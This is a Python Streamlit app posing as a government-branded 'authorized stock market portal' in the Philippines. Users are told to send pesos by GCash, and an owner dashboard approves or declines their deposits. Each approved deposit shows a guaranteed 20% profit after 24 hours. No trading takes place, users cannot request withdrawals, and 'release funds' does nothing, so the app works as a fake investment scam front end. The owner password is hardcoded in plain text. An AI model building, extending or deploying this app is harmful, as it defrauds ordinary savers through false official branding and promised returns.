import streamlit as st
import time
from datetime import datetime, timedelta

# --- 1. APP CONFIGURATION ---
st.set_page_config(page_title="BP Market", page_icon="🇵🇭")

# --- 2. THEME & UI ---
st.markdown("""
<style>
    .stApp { margin-top: 20px; }
    input[type="text"] { text-transform: uppercase; }
    .stButton>button {
        width: 100%;
        border-radius: 12px;
        height: 3.5em;
        background-color: #0038a8;
        color: white;
        font-weight: bold;
        border: none;
    }
    .logo-text {
        text-align: center;
        color: #0038a8;
        font-weight: 900;
        font-size: 2.2em;
        line-height: 1.2;
    }
    .admin-card {
        background-color: #f0f4f8;
        padding: 15px;
        border-radius: 10px;
        border-left: 5px solid #0038a8;
        margin-bottom: 10px;
    }
</style>
""", unsafe_allow_html=True)

# --- 3. LOGO ---
st.markdown('<p class="logo-text">🇵🇭 BAGONG<br>PILIPINAS</p>', unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #64748b; font-weight: bold;'>AUTHORIZED STOCK MARKET PORTAL</p>", unsafe_allow_html=True)

# --- 4. SESSION STATE (MEMORY) ---
if 'page' not in st.session_state:
    st.session_state.page = "login"
if 'db_user' not in st.session_state:
    st.session_state.db_user = None
if 'deposits' not in st.session_state:
    st.session_state.deposits = []
if 'pending_deposits' not in st.session_state:
    st.session_state.pending_deposits = [] 
if 'pending_withdrawals' not in st.session_state:
    st.session_state.pending_withdrawals = []
if 'show_payment' not in st.session_state:
    st.session_state.show_payment = False

# --- 5. PAGE: LOGIN ---
if st.session_state.page == "login":
    st.subheader("LOGIN")
    l_name = st.text_input("FULL NAME").upper()
    # Inalis ang max_chars para matanggap ang Black01!
    l_pin = st.text_input("PASSWORD / PIN", type="password")
    
    if st.button("ENTER MARKET"):
        # OWNER LOGIN - Gamit ang iyong secret key
        if l_name == "ADMIN" and l_pin == "Black01!":
            st.session_state.page = "admin"
            st.rerun()
        # USER LOGIN
        elif st.session_state.db_user and l_name == st.session_state.db_user['name'] and l_pin == st.session_state.db_user['pin']:
            st.session_state.page = "dashboard"
            st.rerun()
        else:
            st.error("INVALID CREDENTIALS")
    
    st.write("---")
    if st.button("NO ACCOUNT? SIGN UP HERE"):
        st.session_state.page = "signup"
        st.rerun()

# --- 6. PAGE: SIGN UP (Para sa Users - 6 digits pa rin) ---
elif st.session_state.page == "signup":
    st.subheader("CREATE ACCOUNT")
    reg_name = st.text_input("FULL NAME").upper()
    reg_address = st.text_input("FULL ADDRESS").upper()
    st.markdown("---")
    pin1 = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6)
    pin2 = st.text_input("VERIFY 6-DIGIT PIN", type="password", max_chars=6)

    if st.button("COMPLETE REGISTRATION"):
        if pin1 == pin2 and len(pin1) == 6 and pin1.isdigit():
            st.session_state.db_user = {"name": reg_name, "pin": pin1, "address": reg_address}
            st.success("✅ REGISTRATION SUCCESSFUL!")
            time.sleep(1)
            st.session_state.page = "login"
            st.rerun()
        else:
            st.error("ANG PIN AY DAPAT 6 NA NUMERO")

# --- 7. PAGE: OWNER ADMIN PANEL ---
elif st.session_state.page == "admin":
    st.subheader("👑 OWNER DASHBOARD")
    
    tab1, tab2 = st.tabs(["📥 PENDING DEPOSITS", "📤 PENDING WITHDRAWALS"])
    
    with tab1:
        if not st.session_state.pending_deposits:
            st.info("Walang pending na deposito.")
        for i, dep in enumerate(st.session_state.pending_deposits):
            st.markdown(f'<div class="admin-card"><b>User:</b> {dep["user"]}<br><b>Amount:</b> ₱{dep["amount"]:,}</div>', unsafe_allow_html=True)
            c1, c2 = st.columns(2)
            if c1.button("APPROVE", key=f"adep_{i}"):
                st.session_state.deposits.append({"amount": dep['amount'], "release_time": datetime.now() + timedelta(hours=24), "profit": dep['amount'] * 0.20})
                st.session_state.pending_deposits.pop(i)
                st.rerun()
            if c2.button("DECLINE", key=f"ddep_{i}"):
                st.session_state.pending_deposits.pop(i)
                st.rerun()

    with tab2:
        if not st.session_state.pending_withdrawals:
            st.info("Walang pending na withdrawal.")
        for i, wit in enumerate(st.session_state.pending_withdrawals):
            st.markdown(f'<div class="admin-card"><b>User:</b> {wit["user"]}<br><b>Amount:</b> ₱{wit["amount"]:,}</div>', unsafe_allow_html=True)
            c1, c2 = st.columns(2)
            if c1.button("RELEASE FUNDS", key=f"awit_{i}"):
                st.session_state.pending_withdrawals.pop(i)
                st.success("Funds Released!")
                st.rerun()
            if c2.button("REJECT", key=f"dwit_{i}"):
                st.session_state.pending_withdrawals.pop(i)
                st.rerun()

    if st.button("LOGOUT"):
        st.session_state.page = "login"
        st.rerun()

# --- 8. PAGE: USER DASHBOARD ---
elif st.session_state.page == "dashboard":
    total_balance = sum(d['amount'] for d in st.session_state.deposits) + sum(d['profit'] for d in st.session_state.deposits)
    st.metric("TOTAL BALANCE", f"₱{total_balance:,.2f}")

    st.subheader("📥 INVEST (GCASH / BANK)")
    selected_amt = st.selectbox("PESO AMOUNT", [100, 500, 1000, 5000, 10000, 20000, 30000, 50000])
    
    if st.button(f"PROCEED TO PAY ₱{selected_amt:,}"):
        st.session_state.show_payment = True
        st.session_state.pending_amt = selected_amt

    if st.session_state.show_payment:
        st.info(f"Send ₱{st.session_state.pending_amt:,} to GCash and click CONFIRM.")
        if st.button("✅ I HAVE SENT THE PAYMENT"):
            st.session_state.pending_deposits.append({"user": st.session_state.db_user['name'], "amount": float(st.session_state.pending_amt)})
            st.session_state.show_payment = False
            st.success("Request sent to Owner!")
            st.rerun()

    if st.button("LOGOUT"):
        st.session_state.page = "login"
        st.rerun()
